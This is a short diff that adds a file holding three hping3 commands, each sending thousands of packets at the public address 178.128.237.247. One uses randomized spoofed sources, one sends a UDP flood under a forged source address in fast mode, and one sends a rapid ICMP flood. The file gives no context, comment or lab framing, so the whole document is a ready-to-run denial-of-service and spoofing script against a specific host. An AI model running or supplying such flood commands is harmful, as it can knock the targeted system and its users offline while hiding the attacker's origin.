@@ -1,0 +1,7 @@
+ sudo hping3 --rand-source -c 10000 178.128.237.247
+
+ sudo hping3 --udp -c 9000 -a 192.168.0.245 178.128.237.247 --faster
+
+hping3 --icmp -c 11000 -d 1 -i u750 178.128.237.247
+
+
